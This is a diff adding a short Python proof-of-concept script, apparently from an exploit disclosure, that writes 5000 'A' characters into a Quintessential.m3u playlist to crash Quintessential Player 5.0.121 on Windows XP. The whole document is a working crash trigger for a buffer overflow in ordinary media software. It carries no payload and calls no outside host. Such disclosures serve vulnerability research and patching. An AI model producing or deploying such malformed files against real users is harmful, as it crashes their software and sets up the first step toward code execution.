@@ -1,0 +1,15 @@
+#Quintessential Player 5.0.121 .m3u Crash POC
+#vulnerble application link http://www.quinnware.com/downloads.php
+#tested on XP SP2/3
+#author abhishek lyall - abhilyall[at]gmail[dot]com
+#web::: http://aslitsecurity.com  Blog::: http://aslitsecurity.blogspot.com
+#!/usr/bin/python
+
+filename = "Quintessential.m3u"
+
+
+junk = "\x41" * 5000
+
+textfile = open(filename , 'w')
+textfile.write(junk)
+textfile.close()
